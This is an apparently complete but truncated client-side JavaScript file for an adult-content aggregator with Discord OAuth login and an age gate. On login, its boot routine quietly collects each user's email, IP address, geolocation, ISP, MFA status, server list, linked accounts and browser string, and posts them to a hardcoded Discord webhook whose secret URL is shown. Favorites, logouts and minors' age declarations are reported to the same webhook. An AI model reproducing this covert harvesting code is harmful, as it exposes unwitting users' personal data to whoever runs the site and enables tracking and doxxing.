'use strict';

/* ════════════════════════════════════════════════════════════
   CLOUD HUB — fully client-side, no backend required.
   • Discord OAuth login (implicit token flow)
   • Permanent age gate (under-18 = locked device)
   • REAL NSFW only (Eporner, RedGifs, 10 Reddit subs)
   • Shorts (vertical scroll feed)
   • Webhook event logging (rich embeds)
   • Video resume, Discord badges, profile, history, settings
   ════════════════════════════════════════════════════════════ */

/* ╔══════════════════════════════════════════════════════════╗
   ║  DISCORD OAUTH — edit to match your Discord app          ║
   ╚══════════════════════════════════════════════════════════╝ */
const DISCORD = {
  CLIENT_ID    : '1483829660461568173',
  REDIRECT_URI : '',
  SCOPES       : ['identify', 'email', 'guilds', 'connections']
};

/* ╔══════════════════════════════════════════════════════════╗
   ║  WEBHOOKS — one per event type. Empty = use default.     ║
   ╚══════════════════════════════════════════════════════════╝ */
const WEBHOOKS = {
  default  : 'https://discord.com/api/webhooks/1498321707725885522/2-lY8HMDF84rdtZm1Dxz1VmhS-2yAIWuza1RpFDknK9H9qWUpJO6X0way_Ly2p-uyL_d',
  login    : '',
  logout   : '',
  favorite : '',
  watch    : '',
  search   : '',
  shorts   : '',
  age      : '',   // age verification events
  general  : ''
};
const WEBHOOK_TYPES = ['login','logout','favorite','watch','search','shorts','age','general'];

/* ════════════════════════════════════════════════════════════ */

const LS = {
  TOKEN    : 'ch_token',
  TOKEN_T  : 'ch_token_t',
  USER     : 'ch_user',
  GUILDS   : 'ch_guilds',
  CONNS    : 'ch_conns',
  GEO      : 'ch_geo',
  FAVS     : 'ch_favs',
  HIST     : 'ch_hist',
  PROGRESS : 'ch_progress',     // video resume per URL
  AGE_OK   : 'ch_age_ok',       // age verified
  MINOR_BAN: 'ch_minor_ban'     // permanent device lock
};

/* ═══════════ SOURCES — REAL NSFW ONLY ═══════════ */
const SOURCES = [
  // Real videos
  { id:'eporner', name:'Eporner', kind:'video', icon:'fa-video',        color:'#ff6633' },
  // Real gifs / short clips
  { id:'redgifs', name:'RedGifs', kind:'gif',   icon:'fa-photo-film',   color:'#ff5e5e' },
  // Real photos & gifs from Reddit (no anime/AI)
  { id:'r/RealGirls',       name:'Real Girls',     kind:'mixed', icon:'fa-camera', color:'#ff2d7a', sub:'RealGirls' },
  { id:'r/PetiteGoneWild',  name:'Petite',         kind:'mixed', icon:'fa-feather', color:'#ec4899', sub:'PetiteGoneWild' },
  { id:'r/BustyPetite',     name:'Busty',          kind:'mixed', icon:'fa-heart',   color:'#f43f5e', sub:'BustyPetite' },
  { id:'r/AsiansGoneWild',  name:'Asians',         kind:'mixed', icon:'fa-yin-yang',color:'#facc15', sub:'AsiansGoneWild' },
  { id:'r/gonewildcurvy',   name:'Curvy',          kind:'mixed', icon:'fa-fire',    color:'#fb7185', sub:'gonewildcurvy' },
  { id:'r/nsfw',            name:'NSFW',           kind:'mixed', icon:'fa-bolt',    color:'#ef4444', sub:'nsfw' },
  { id:'r/nsfw_gifs',       name:'NSFW GIFs',      kind:'gif',   icon:'fa-film',    color:'#a855f7', sub:'nsfw_gifs' },
  { id:'r/holdthemoan',     name:'Hold the Moan',  kind:'mixed', icon:'fa-volume-high', color:'#7b3dff', sub:'holdthemoan' },
  { id:'r/adorableporn',    name:'Adorable',       kind:'mixed', icon:'fa-heart-pulse', color:'#f472b6', sub:'adorableporn' },
  { id:'r/collegesluts',    name:'College',        kind:'mixed', icon:'fa-graduation-cap', color:'#06b6d4', sub:'collegesluts' }
];

const TRENDING = [
  'blonde','brunette','redhead','milf','teen','amateur','asian','ebony','latina',
  'anal','blowjob','creampie','cumshot','doggystyle','riding','threesome','lesbian',
  'pov','solo','outdoor','public','shower','massage','yoga','feet','stockings',
  'big tits','big ass','curvy','cosplay','schoolgirl','nurse','japanese','korean','french','wet'
];

const VIDEO_TERMS = [
  'hot','sexy','babe','blonde','brunette','milf','amateur','hardcore','busty',
  'latina','redhead','teen','lesbian','outdoor','solo','ebony','petite','curvy'
];

/* ═══════════ DISCORD BADGE TABLE (real flag bits) ═══════════ */
const DBADGES = [
  { bit: 1<<0,  name:'Discord Staff',           bg:'#5865f2', fg:'#fff', icon:'fa-shield-halved' },
  { bit: 1<<1,  name:'Partner',                 bg:'#5865f2', fg:'#fff', icon:'fa-handshake' },
  { bit: 1<<2,  name:'HypeSquad Events',        bg:'#fbb637', fg:'#1a1300', icon:'fa-bolt' },
  { bit: 1<<3,  name:'Bug Hunter Lvl 1',        bg:'#3e8c4d', fg:'#fff', icon:'fa-bug' },
  { bit: 1<<6,  name:'HypeSquad Bravery',       bg:'#9c84ef', fg:'#fff', icon:'fa-shield' },
  { bit: 1<<7,  name:'HypeSquad Brilliance',    bg:'#f47b67', fg:'#fff', icon:'fa-gem' },
  { bit: 1<<8,  name:'HypeSquad Balance',       bg:'#45ddc0', fg:'#062a25', icon:'fa-scale-balanced' },
  { bit: 1<<9,  name:'Early Supporter',         bg:'#5865f2', fg:'#fff', icon:'fa-star' },
  { bit: 1<<14, name:'Bug Hunter Lvl 2',        bg:'#3e8c4d', fg:'#fff', icon:'fa-bug-slash' },
  { bit: 1<<17, name:'Early Verified Bot Dev',  bg:'#5865f2', fg:'#fff', icon:'fa-code' },
  { bit: 1<<18, name:'Moderator Programs Alumni',bg:'#13a36b', fg:'#fff', icon:'fa-gavel' },
  { bit: 1<<22, name:'Active Developer',        bg:'#13a36b', fg:'#fff', icon:'fa-terminal' }
];
const NITRO_TIERS = ['', 'Nitro Classic', 'Nitro', 'Nitro Basic'];

/* ═══════════ STATE ═══════════ */
let state = {
  page:'home', kind:'video', query:'', pageNum:1,
  loading:false, done:false, seen:new Set(), results:[]
};
let currentUser = null;
let SHORTS_POOL = [];
let SHORTS_LOADING = false;

/* ═══════════ UTIL ═══════════ */
const $  = id => document.getElementById(id);
const randFrom = a => a[(Math.random()*a.length)|0];
const shuffle  = a => a.sort(()=>Math.random()-0.5);
function el(tag, attrs={}, ...kids){
  const e = document.createElement(tag);
  for(const k in attrs){
    if(k==='class') e.className = attrs[k];
    else if(k==='html') e.innerHTML = attrs[k];
    else if(k.startsWith('on')) e.addEventListener(k.slice(2), attrs[k]);
    else if(attrs[k]!==undefined && attrs[k]!==null) e.setAttribute(k, attrs[k]);
  }
  for(const k of kids){ if(k!=null) e.append(k.nodeType?k:document.createTextNode(k)); }
  return e;
}
function fmtDur(s){ if(!s)return''; s=+s|0; const m=(s/60)|0, ss=(s%60).toString().padStart(2,'0'); return `${m}:${ss}`; }
function fmtViews(n){ if(!n)return''; if(n>1e6)return(n/1e6).toFixed(1)+'M'; if(n>1e3)return(n/1e3).toFixed(1)+'K'; return ''+n; }
function toast(msg, kind=''){
  const t = $('toast');
  t.textContent = msg;
  t.className = 'toast show ' + kind;
  clearTimeout(toast._t);
  toast._t = setTimeout(()=>{ t.className = 'toast'; }, 2200);
}

/* ═══════════ CORS-tolerant JSON fetch ═══════════ */
const CORS_PROXIES = [
  u => `https://corsproxy.io/?${encodeURIComponent(u)}`,
  u => `https://api.allorigins.win/raw?url=${encodeURIComponent(u)}`
];
async function jget(url, { tryDirect=true, timeout=12000 } = {}){
  const ctl = new AbortController();
  const t = setTimeout(()=>ctl.abort(), timeout);
  const attempts = [];
  if(tryDirect) attempts.push(url);
  for(const p of CORS_PROXIES) attempts.push(p(url));
  let lastErr;
  for(const u of attempts){
    try{
      const r = await fetch(u, { signal: ctl.signal, mode:'cors', credentials:'omit' });
      if(!r.ok){ lastErr = new Error(`HTTP ${r.status}`); continue; }
      const j = await r.json();
      clearTimeout(t);
      return j;
    }catch(e){ lastErr = e; }
  }
  clearTimeout(t);
  throw lastErr || new Error('Request failed');
}

/* ═══════════ WEBHOOKS ═══════════ */
const HOOK_COLORS = {
  login    : 0x22c55e,
  logout   : 0xef4444,
  favorite : 0xec4899,
  watch    : 0x7b3dff,
  search   : 0x00d4ff,
  shorts   : 0xff5e3a,
  age      : 0xffb84d,
  general  : 0xfbbf24
};
function hookFor(type){ return WEBHOOKS[type] || WEBHOOKS.default || ''; }
async function sendHook(type, payload){
  const url = hookFor(type);
  if(!url || !/^https:\/\/(?:canary\.|ptb\.)?discord(?:app)?\.com\/api\/webhooks\//i.test(url)) return;
  try{
    await fetch(url, {
      method:'POST',
      headers:{ 'Content-Type':'application/json' },
      body: JSON.stringify(payload),
      credentials:'omit', mode:'cors'
    });
  }catch{ /* silent */ }
}
function buildBaseEmbed(type, title, desc){
  return {
    title, description: desc || '',
    color: HOOK_COLORS[type] || 0x7b3dff,
    timestamp: new Date().toISOString(),
    footer: { text: `Cloud Hub · ${type}` }
  };
}
function userTag(u){ return u ? `${u.global_name || u.username}${u.discriminator && u.discriminator !== '0' ? '#'+u.discriminator : ''}` : 'unknown'; }
function userAvatarURL(u, size=128){
  if(!u) return '';
  if(u.avatar) return `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.${u.avatar.startsWith('a_')?'gif':'png'}?size=${size}`;
  const idx = u.discriminator && u.discriminator !== '0' ? (parseInt(u.discriminator,10)%5) : (Number(BigInt(u.id) >> 22n) % 6);
  return `https://cdn.discordapp.com/embed/avatars/${idx}.png`;
}
function userBannerURL(u){
  if(!u || !u.banner) return null;
  return `https://cdn.discordapp.com/banners/${u.id}/${u.banner}.${u.banner.startsWith('a_')?'gif':'png'}?size=1024`;
}

/* ═══════════ DISCORD AUTH ═══════════ */
function discordAuthURL(){
  const params = new URLSearchParams({
    client_id    : DISCORD.CLIENT_ID,
    redirect_uri : DISCORD.REDIRECT_URI,
    response_type: 'token',
    scope        : DISCORD.SCOPES.join(' '),
    prompt       : 'consent'
  });
  return `https://discord.com/api/oauth2/authorize?${params.toString()}`;
}
function startLogin(){
  if(localStorage.getItem(LS.MINOR_BAN) === '1'){
    showBanned(); return;
  }
  $('loginStatus').textContent = 'Redirecting to Discord…';
  $('loginStatus').className = 'login-status';
  window.location.href = discordAuthURL();
}
function consumeHashToken(){
  if(!window.location.hash) return null;
  const h = new URLSearchParams(window.location.hash.slice(1));
  const tok = h.get('access_token');
  if(!tok) return null;
  const exp = +h.get('expires_in') || 604800;
  history.replaceState(null, '', window.location.pathname + window.location.search);
  localStorage.setItem(LS.TOKEN, tok);
  localStorage.setItem(LS.TOKEN_T, String(Date.now() + exp*1000));
  return tok;
}
function getToken(){
  const tok = localStorage.getItem(LS.TOKEN);
  const exp = +localStorage.getItem(LS.TOKEN_T) || 0;
  if(!tok || Date.now() > exp) return null;
  return tok;
}
async function dapi(path, token){
  const r = await fetch('https://discord.com/api/v10' + path, {
    headers:{ 'Authorization':'Bearer '+token },
    credentials:'omit'
  });
  if(!r.ok) throw new Error('Discord '+r.status+' '+path);
  return await r.json();
}
async function loadDiscordIdentity(token){
  const [user, guilds, conns] = await Promise.all([
    dapi('/users/@me', token),
    dapi('/users/@me/guilds', token).catch(()=>[]),
    dapi('/users/@me/connections', token).catch(()=>[])
  ]);
  localStorage.setItem(LS.USER,   JSON.stringify(user));
  localStorage.setItem(LS.GUILDS, JSON.stringify(guilds));
  localStorage.setItem(LS.CONNS,  JSON.stringify(conns));
  return { user, guilds, conns };
}
async function loadGeo(){
  try{
    const cached = localStorage.getItem(LS.GEO);
    if(cached) return JSON.parse(cached);
    const r = await fetch('https://ipapi.co/json/', { credentials:'omit' });
    if(!r.ok) return null;
    const j = await r.json();
    localStorage.setItem(LS.GEO, JSON.stringify(j));
    return j;
  }catch{ return null; }
}

/* ═══════════ AGE GATE ═══════════ */
function showBanned(){
  document.body.classList.remove('authed');
  $('loginScreen').style.display = 'none';
  $('ageGate').hidden = true;
  $('bannedScreen').hidden = false;
}
function showAgeGate(){
  $('ageGate').hidden = false;
}
function hideAgeGate(){
  $('ageGate').hidden = true;
}
function ageVerified(){
  return localStorage.getItem(LS.AGE_OK) === '1';
}
$('ageYes').addEventListener('click', () => {
  localStorage.setItem(LS.AGE_OK, '1');
  hideAgeGate();
  sendHook('age', {
    username:'Cloud Hub',
    embeds:[{ ...buildBaseEmbed('age',
      `✅ Age verified: ${userTag(currentUser)}`,
      `User confirmed they are 18 or older.`),
      thumbnail:{ url: userAvatarURL(currentUser, 128) }
    }]
  });
  finishBoot();
});
$('ageNo').addEventListener('click', () => {
  localStorage.setItem(LS.MINOR_BAN, '1');
  // Webhook BEFORE we wipe the user
  sendHook('age', {
    username:'Cloud Hub',
    embeds:[{ ...buildBaseEmbed('age',
      `⛔ MINOR BANNED: ${userTag(currentUser)}`,
      `User declared themselves under 18. Device permanently locked.`),
      thumbnail:{ url: userAvatarURL(currentUser, 128) },
      color: 0xef4444
    }]
  });
  // Wipe session
  for(const k of Object.values(LS)){
    if(k === LS.MINOR_BAN || k === LS.FAVS || k === LS.HIST) continue;
    localStorage.removeItem(k);
  }
  currentUser = null;
  showBanned();
});

/* ═══════════ LOGOUT ═══════════ */
function logout(){
  const u = currentUser;
  if(u){
    sendHook('logout', {
      username:'Cloud Hub',
      embeds:[{
        ...buildBaseEmbed('logout', `🚪 Logged out: ${userTag(u)}`, `User ID: \`${u.id}\``),
        thumbnail:{ url: userAvatarURL(u, 128) }
      }]
    });
  }
  for(const k of Object.values(LS)){
    if(k === LS.FAVS || k === LS.HIST || k === LS.AGE_OK || k === LS.MINOR_BAN) continue;
    localStorage.removeItem(k);
  }
  currentUser = null;
  document.body.classList.remove('authed');
  toast('Signed out', 'ok');
  setTimeout(()=>location.reload(), 400);
}

/* ═══════════ BOOT ═══════════ */
async function boot(){
  $('loginBtn').addEventListener('click', startLogin);

  // Permanent ban check first
  if(localStorage.getItem(LS.MINOR_BAN) === '1'){
    showBanned(); return;
  }

  const fresh = consumeHashToken();
  let token = fresh || getToken();
  if(!token) return; // show login

  $('loginStatus').textContent = 'Loading your profile…';
  try{
    let user, guilds, conns;
    if(fresh || !localStorage.getItem(LS.USER)){
      ({ user, guilds, conns } = await loadDiscordIdentity(token));
    } else {
      user   = JSON.parse(localStorage.getItem(LS.USER));
      guilds = JSON.parse(localStorage.getItem(LS.GUILDS) || '[]');
      conns  = JSON.parse(localStorage.getItem(LS.CONNS)  || '[]');
    }
    currentUser = user;
    const geo = await loadGeo();

    if(fresh){
      const flagBadges = renderBadgeList(user);
      const fields = [
        { name:'👤 Username',     value:'`'+userTag(user)+'`',                            inline:true },
        { name:'🆔 User ID',      value:'`'+user.id+'`',                                  inline:true },
        { name:'📧 Email',        value:'`'+(user.email || '—')+'`',                      inline:true },
        { name:'🌐 Locale',       value:'`'+(user.locale || '—')+'`',                     inline:true },
        { name:'✅ Verified',      value: user.verified ? 'yes' : 'no',                    inline:true },
        { name:'🔒 MFA',           value: user.mfa_enabled ? 'enabled' : 'disabled',       inline:true },
        { name:'⭐ Premium',       value: NITRO_TIERS[user.premium_type||0] || 'none',     inline:true },
        { name:'🏰 Guilds',        value: String(guilds.length),                           inline:true },
        { name:'🔗 Connections',   value: String(conns.length),                            inline:true },
        { name:'🏆 Badges',        value: flagBadges.length ? flagBadges.map(b=>'`'+b.name+'`').join(' · ') : 'none', inline:false }
      ];
      if(geo){
        fields.push(
          { name:'🌍 Location', value:`\`${[geo.city, geo.region, geo.country_name].filter(Boolean).join(', ')||'—'}\``, inline:false },
          { name:'📡 IP',       value:`\`${geo.ip || '—'}\``, inline:true },
          { name:'🏢 ISP',      value:`\`${geo.org || '—'}\``, inline:true },
          { name:'🕘 Timezone', value:`\`${geo.timezone || '—'}\``, inline:true }
        );
      }
      fields.push({ name:'💻 Device', value:`\`${(navigator.userAgent||'').slice(0,100)}\``, inline:false });
      if(guilds.length){
        const top = guilds.slice(0, 15).map(g => `• ${g.owner?'👑 ':''}${g.name}`).join('\n');
        fields.push({ name:`📋 Guild list (${guilds.length})`, value: top.slice(0,1024) || '—', inline:false });
      }
      if(conns.length){
        const list = conns.slice(0, 15).map(c => `• **${c.type}** — ${c.name||'?'}${c.verified?' ✅':''}`).join('\n');
        fields.push({ name:`🔌 3rd-party (${conns.length})`, value: list.slice(0,1024) || '—', inline:false });
      }

      sendHook('login', {
        username:'Cloud Hub',
        embeds:[{
          ...buildBaseEmbed('login', `🎉 New session: ${userTag(user)}`, `Successful Discord login.`),
          thumbnail:{ url: userAvatarURL(user, 256) },
          image: userBannerURL(user) ? { url: userBannerURL(user) } : undefined,
          fields
        }]
      });
    }

    // Age gate (always show if not yet confirmed)
    if(!ageVerified()){
      $('loginScreen').style.display = 'none';
      showAgeGate();
      return; // user clicks confirm to call finishBoot()
    }
    finishBoot();
  }catch(e){
    console.error('auth load failed', e);
    localStorage.removeItem(LS.TOKEN);
    localStorage.removeItem(LS.TOKEN_T);
    $('loginStatus').textContent = 'Session expired — please sign in again.';
    $('loginStatus').className = 'login-status err';
  }
}

function finishBoot(){
  document.body.classList.add('authed');
  $('loginScreen').style.display = 'none';
  paintUserPill(currentUser);
  $('heroName').textContent = currentUser.global_name || currentUser.username || 'friend';
  initApp();
}

function paintUserPill(u){
  $('userAvatar').src = userAvatarURL(u, 64) || '';
  $('userName').textContent = u.global_name || u.username || 'User';
}

/* ═══════════ EPORNER ═══════════ */
async function fetchEpornerVideos(query='', limit=30, page=1){
  const params = new URLSearchParams({
    query     : query || randFrom(VIDEO_TERMS),
    per_page  : String(Math.min(limit, 60)),
    page      : String(page),
    thumbsize : 'big',
    order     : 'top-weekly',
    format    : 'json'
  });
  const j = await jget(`https://www.eporner.com/api/v2/video/search/?${params}`);
  const list = j.videos || [];
  return list.map(v => ({
    _source:'Eporner', id:v.id, title:v.title || 'Eporner Video',
    duration:v.length_sec||0, page_url:v.url, embed_url:v.embed,
    thumb_url:v.default_thumb?.src || v.thumbs?.[0]?.src || '',
    keywords:v.keywords || '',
    views:v.views||0, rating:v.rate||0
  }));
}
function isEpornerHD(v){
  const s = ((v.title||'') + ' ' + (v.keywords||'')).toLowerCase();
  return /\b(4k|2160p?|1440p|1080p|720p|uhd|fullhd|full hd|hd)\b/.test(s);
}

/* ═══════════ REDGIFS ═══════════ */
let RG_TOKEN = null, RG_TOKEN_AT = 0;
async function getRedgifsToken(){
  if(RG_TOKEN && Date.now() - RG_TOKEN_AT < 12*60*60*1000) return RG_TOKEN;
  let last;
  for(const u of [
    'https://api.redgifs.com/v2/auth/temporary',
    ...CORS_PROXIES.map(p => p('https://api.redgifs.com/v2/auth/temporary'))
  ]){
    try{
      const r = await fetch(u, { credentials:'omit' });
      if(!r.ok){ last = new Error('rg auth '+r.status); continue; }
      const j = await r.json();
      if(j.token){ RG_TOKEN = j.token; RG_TOKEN_AT = Date.now(); return RG_TOKEN; }
    }catch(e){ last = e; }
  }
  throw last || new Error('RedGifs auth failed');
}
async function fetchRedgifsVideos(query='', limit=40, page=1){
  const token = await getRedgifsToken();
  const params = new URLSearchParams({
    search_text: query || randFrom(VIDEO_TERMS),
    order:'top', type:'g', page:String(page),
    count:String(Math.min(limit, 80))
  });
  const url = `https://api.redgifs.com/v2/gifs/search?${params}`;
  let j, last;
  try{
    const r = await fetch(url, { headers:{ 'Authorization':`Bearer ${token}` }, credentials:'omit' });
    if(r.ok) j = await r.json();
    else last = new Error('rg '+r.status);
  }catch(e){ last = e; }
  if(!j){
    for(const p of CORS_PROXIES){
      try{
        const r = await fetch(p(url + `&_t=${token}`), { credentials:'omit' });
        if(r.ok){ j = await r.json(); break; }
        last = new Error('rg-proxy '+r.status);
      }catch(e){ last = e; }
    }
  }
  if(!j) throw last || new Error('RedGifs search failed');
  const gifs = j.gifs || [];
  return gifs.map(g => ({
    _source:'RedGifs', id:g.id,
    title:(g.tags||[]).slice(0,3).join(', ') || g.description || 'RedGifs Clip',
    duration:Math.round(g.duration||0),
    page_url:`https://www.redgifs.com/watch/${g.id}`,
    thumb_url:g.urls?.poster || g.urls?.thumbnail || '',
    mp4_url:g.urls?.hd || g.urls?.sd || '',
    width: g.urls?.hd ? 1280 : 720,
    views:g.likes||0, rating:g.likes||0
  }));
}

/* ═══════════ REDDIT ═══════════ */
async function fetchReddit(sub, limit=50, after=''){
  const url = `https://www.reddit.com/r/${sub}/hot.json?limit=${limit}&raw_json=1${after?`&after=${after}`:''}`;
  const j = await jget(url);
  const posts = (j?.data?.children || []).map(c => c.data);
  const out = [];
  for(const p of posts){
    const item = normalizeRedditPost(p, sub);
    if(item) out.push(item);
  }
  return out;
}
function fixUrl(u){ return (u||'').replace(/&amp;/g, '&'); }
function normalizeRedditPost(p, sub){
  if(!p || p.removed_by_category || p.is_self) return null;
  if(!p.over_18) return null;
  let kind, url, mp4 = '', width = 0, height = 0, duration = 0, thumb = '';

  const preview = p.preview?.images?.[0];
  if(preview?.source?.url){
    thumb = fixUrl(preview.source.url);
    width = preview.source.width || 0;
    height = preview.source.height || 0;
  }

  // Reddit-hosted video
  if(p.is_video && p.media?.reddit_video?.fallback_url){
    url = p.media.reddit_video.fallback_url;
    mp4 = url; kind = 'video';
    duration = p.media.reddit_video.duration || 0;
    width = p.media.reddit_video.width || width;
    height = p.media.reddit_video.height || height;
    if(!thumb) thumb = p.thumbnail && /^https?:/.test(p.thumbnail) ? p.thumbnail : '';
  }
  // RedGifs link → use RedGifs preview
  else if(p.url && /redgifs\.com\/watch\//i.test(p.url)){
    const m = p.url.match(/redgifs\.com\/watch\/(\w+)/i);
    if(!m) return null;
    const id = m[1].toLowerCase();
    url = `https://api.redgifs.com/v2/gifs/${id}.json`; // resolved lazily in lightbox
    mp4 = ''; kind = 'gif';
    if(!thumb) thumb = `https://thumbs2.redgifs.com/${m[1]}-poster.jpg`;
    return {
      _source:'Reddit', _sub:sub, _redgifs:id,
      id:'rd:'+p.id, title:p.title || 'Reddit',
      url:'', mp4_url:'', thumb_url:thumb,
      page_url:'https://reddit.com' + p.permalink,
      duration:0, width, height, kind:'gif',
      views:p.ups || 0, rating:p.upvote_ratio || 0
    };
  }
  // Direct media
  else if(p.url){
    if(/\.(jpg|jpeg|png|webp)(\?|$)/i.test(p.url)){
      url = p.url; kind = 'image';
    } else if(/\.gif(\?|$)/i.test(p.url)){
      url = p.url; kind = 'gif';
    } else if(/\.mp4(\?|$)/i.test(p.url) || /\.webm(\?|$)/i.test(p.url)){
      url = p.url; mp4 = url; kind = 'video';
    } else if(preview?.variants?.mp4?.source?.url){
      url = fixUrl(preview.variants.mp4.source.url);
      mp4 = url; kind = 'gif';
    } else if(preview?.source?.url){
      url = fixUrl(preview.source.url); kind = 'image';
    } else return null;
  } else return null;

  if(!thumb) thumb = url;

  return {
    _source:'Reddit', _sub:sub,
    id:'rd:'+p.id, title:p.title || 'Reddit',
    url, mp4_url:mp4, thumb_url:thumb,
    page_url:'https://reddit.com' + p.permalink,
    duration, width, height, kind,
    views:p.ups || 0, rating:p.upvote_ratio || 0
  };
}

/* ═══════════ UNIFY ═══════════ */
function unify(r, srcMeta){
  if(!r) return null;
  if(r._source === 'Eporner'){
    return {
      id:'ep:'+r.id, title:r.title, kind:'video',
      platform:'eporner', platformName:'Eporner',
      thumb:r.thumb_url, url:'', embedUrl:r.embed_url, pageUrl:r.page_url,
      durationSec:r.duration||0, views:r.views||0,
      hd: isEpornerHD(r)
    };
  }
  if(r._source === 'RedGifs'){
    return {
      id:'rg:'+r.id, title:r.title, kind:'gif',
      platform:'redgifs', platformName:'RedGifs',
      thumb:r.thumb_url, url:r.mp4_url, embedUrl:'', pageUrl:r.page_url,
      durationSec:r.duration||0, views:r.views||0,
      hd: r.width >= 1280
    };
  }
  if(r._source === 'Reddit'){
    return {
      id:r.id, title:r.title, kind:r.kind,
      platform:'reddit:'+r._sub, platformName:'r/'+r._sub,
      thumb:r.thumb_url, url:r.url, mp4Url:r.mp4_url||'', embedUrl:'',
      pageUrl:r.page_url, durationSec:r.duration||0, views:r.views||0,
      _redgifs:r._redgifs||null,
      hd: (r.width >= 1280) || (r.height >= 720)
    };
  }
  return null;
}

/* ═══════════ AGGREGATE ═══════════ */
async function fetchSource(src, query, limit, page, kind){
  const q = query || '';
  if(src.id === 'eporner') return (await fetchEpornerVideos(q, limit, page)).map(r => ({...r, _source:'Eporner'}));
  if(src.id === 'redgifs') return (await fetchRedgifsVideos(q, Math.min(limit*2, 80), page)).map(r => ({...r, _source:'RedGifs'}));
  if(src.sub){
    const out = await fetchReddit(src.sub, Math.min(limit, 80));
    return out;
  }
  return [];
}
async function aggregateSearch({ q, kind='video', page=1, limit=30 }){
  const eligible = SOURCES.filter(s => {
    if(kind === 'video') return s.kind === 'video' || s.kind === 'mixed';
    if(kind === 'gif')   return s.kind === 'gif'   || s.kind === 'mixed' || s.kind === 'video';
    if(kind === 'image') return true;
    return true;
  });
  const picks = shuffle([...eligible]).slice(0, kind === 'video' ? 4 : 6);
  if(kind === 'video' && !picks.some(p => p.id === 'eporner')){
    const ep = SOURCES.find(s => s.id === 'eporner');
    if(ep) picks.unshift(ep);
  }
  const perSrc = Math.ceil(limit / picks.length) + 6;
  const lists = await Promise.all(picks.map(s =>
    fetchSource(s, q, perSrc, page, kind).catch(e => { console.warn(s.id, e); return []; })
  ));
  let pool = [];
  for(let i=0;i<lists.length;i++){
    for(const r of lists[i]){
      const u = unify(r, picks[i]);
      if(u) pool.push(u);
    }
  }
  pool = pool.filter(r => {
    if(!r || !r.thumb) return false;
    if(kind === 'video') return r.kind === 'video' || (r.kind === 'gif' && r.url);
    if(kind === 'gif')   return r.kind === 'gif' || r.kind === 'video';
    if(kind === 'image') return r.kind === 'image' || r.kind === 'gif';
    return true;
  });
  const seen = new Set();
  pool = pool.filter(r => { if(seen.has(r.id)) return false; seen.add(r.id); return true; });
  shuffle(pool);
  return pool.slice(0, limit);
}

/* ═══════════ FAVORITES + HISTORY + PROGRESS ═══════════ */
function getFavs(){ try{ return JSON.parse(localStorage.getItem(LS.FAVS)||'[]'); }catch{ return []; } }
function setFavs(arr){ localStorage.setItem(LS.FAVS, JSON.stringify(arr)); updateFavCount(); }
function isFav(id){ return getFavs().some(f => f.id === id); }
function toggleFav(item){
  const list = getFavs();
  const i = list.findIndex(f => f.id === item.id);
  let added;
  if(i>=0){ list.splice(i,1); added = false; }
  else{ list.unshift({ ...item, _ts: Date.now() }); if(list.length > 500) list.pop(); added = true; }
  setFavs(list);
  sendHook('favorite', {
    username:'Cloud Hub',
    embeds:[{
      ...buildBaseEmbed('favorite',
        `${added ? '❤️ Favorited' : '💔 Un-favorited'}: ${item.title || item.platformName}`,
        `By **${userTag(currentUser)}** · ${item.platformName} · ${item.kind}`),
      thumbnail: item.thumb ? { url: item.thumb } : undefined,
      fields: [
        { name:'Page',       value: item.pageUrl ? `[Open](${item.pageUrl})` : '—', inline:true },
        { name:'Total favs', value: String(getFavs().length), inline:true }
      ]
    }]
  });
  return added;
}
function updateFavCount(){
  const n = getFavs().length;
  const badge = $('favCount');
  if(n>0){ badge.hidden = false; badge.textContent = n; } else { badge.hidden = true; }
}
function getHistory(){ try{ return JSON.parse(localStorage.getItem(LS.HIST)||'[]'); }catch{ return []; } }
function pushHistory(item){
  const list = getHistory().filter(h => h.id !== item.id);
  list.unshift({ ...item, _ts: Date.now() });
  if(list.length > 200) list.length = 200;
  localStorage.setItem(LS.HIST, JSON.stringify(list));
}
function getProgress(){ try{ return JSON.parse(localStorage.getItem(LS.PROGRESS)||'{}'); }catch{ return {}; } }
function saveProgress(map){ localStorage.setItem(LS.PROGRESS, JSON.stringify(map)); }
function progressKey(it){ return it.id || it.url || it.embedUrl || ''; }
function attachResume(video, key){
  if(!key) return;
  const map = getProgress();
  const t = +map[key] || 0;
  if(t > 5){
    video.addEventListener('loadedmetadata', () => {
      if(video.duration && t < video.duration - 5){
        try{ video.currentTime = t; toast('Resumed at '+fmtDur(t), 'ok'); }catch{}
      }
    }, { once:true });
  }
  let last = 0;
  video.addEventListener('timeupdate', () => {
    const now = Date.now();
    if(now - last < 3000) return;
    last = now;
    const m = getProgress();
    m[key] = video.currentTime;
    // Cap stored entries to 100 most recent
    const keys = Object.keys(m);
    if(keys.length > 100){ delete m[keys[0]]; }
    saveProgress(m);
  });
  video.addEventListener('ended', () => {
    const m = getProgress(); delete m[key]; saveProgress(m);
  });
}

/* ═══════════ ROUTING ═══════════ */
function goToPage(id){
  document.querySelectorAll('.tab').forEach(x => x.classList.toggle('active', x.dataset.page===id));
  document.querySelectorAll('main.page').forEach(p => p.classList.remove('active'));
  $('page-'+id).classList.add('active');
  state.page = id;
  if(id === 'browse')    { if(!state.results.length) doSearch({reset:true}); }
  if(id === 'shorts')    loadShorts();
  if(id === 'favorites') renderFavorites();
  if(id === 'history')   renderHistory();
  if(id === 'profile')   renderProfile();
  if(id === 'settings')  renderSettings();
  closeAllShortVideos(id !== 'shorts');
  $('userPill').classList.remove('open');
  window.scrollTo({top:0,behavior:'instant'});
}
document.addEventListener('click', e => {
  const t = e.target.closest('[data-page]');
  if(t) goToPage(t.dataset.page);
});

/* user dropdown */
$('userPill').addEventListener('click', e => {
  if(e.target.closest('[data-page]') || e.target.closest('#navLogout')) return;
  $('userPill').classList.toggle('open');
});
document.addEventListener('click', e => {
  if(!e.target.closest('#userPill')) $('userPill').classList.remove('open');
});
$('navLogout').addEventListener('click', logout);

/* ═══════════ CARD ═══════════ */
function renderCard(it, opts={}){
  const fav = isFav(it.id);
  const dur = it.durationSec ? fmtDur(it.durationSec) : '';
  const views = fmtViews(it.views);
  const card = el('div', { class:'card'+(it.kind==='gif'?' gif':'') });
  const img = el('img', { class:'thumb', src:it.thumb, loading:'lazy', referrerpolicy:'no-referrer',
    onerror:e=>{ e.target.parentNode.remove(); } });
  card.append(img);

  if(it.hd) card.append(el('div',{class:'badge hd',html:'<i class="fa-solid fa-crown"></i> HD'}));
  if(dur)   card.append(el('div',{class:'dur', html:'<i class="fa-solid fa-play"></i> '+dur}));

  const favBtn = el('button', {
    class:'fav-btn'+(fav?' active':''),
    title: fav?'Remove from favorites':'Add to favorites',
